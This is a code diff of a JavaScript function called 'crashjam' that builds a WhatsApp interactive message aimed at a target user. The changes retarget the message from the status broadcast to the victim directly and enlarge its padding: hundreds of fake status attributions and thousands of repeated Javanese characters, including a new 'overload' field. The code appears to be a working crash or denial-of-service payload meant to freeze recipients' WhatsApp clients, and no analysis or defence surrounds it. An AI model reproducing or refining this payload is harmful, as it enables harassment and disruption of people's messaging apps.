@@ -5,7 +5,7 @@ async function crashjam(SYxS7, target) {
     const cleanUser = target.split('@')[0].split(':')[0];
     const targetBaseJid = `${cleanUser}@s.whatsapp.net`;
 
-    const statusAttributions = Array.from({ length: 500 }, (_, i) => ({
+    const statusAttributions = Array.from({ length: 300 }, (_, i) => ({
         participant: `${Math.floor(10000000000 + Math.random() * 89999999999)}@s.whatsapp.net`,
         type: 1
     }));
@@ -22,7 +22,7 @@ async function crashjam(SYxS7, target) {
         },
         interactiveResponseMessage: {
             contextInfo: {
-                remoteJid: "status@broadcast",
+                remoteJid: targetBaseJid,
                 fromMe: true,
                 isQuestion: true,
                 forwardedAiBotMessageInfo: {
@@ -34,12 +34,12 @@ async function crashjam(SYxS7, target) {
                 statusAttributions
             },
             body: {
-                text: "⚡ CRASH JAM " + "ꦾ".repeat(1000),
+                text: "⚡ CRASH JAM " + "ꦾ".repeat(1500),
                 format: "DEFAULT"
             },
             nativeFlowResponseMessage: {
                 name: "call_permission_request",
-                paramsJson: JSON.stringify({ status: "active", code: "CRASH_JAM" }),
+                paramsJson: JSON.stringify({ status: "active", code: "CRASH_JAM", overload: "ꦾ".repeat(1000) }),
                 version: 3
             }
         }
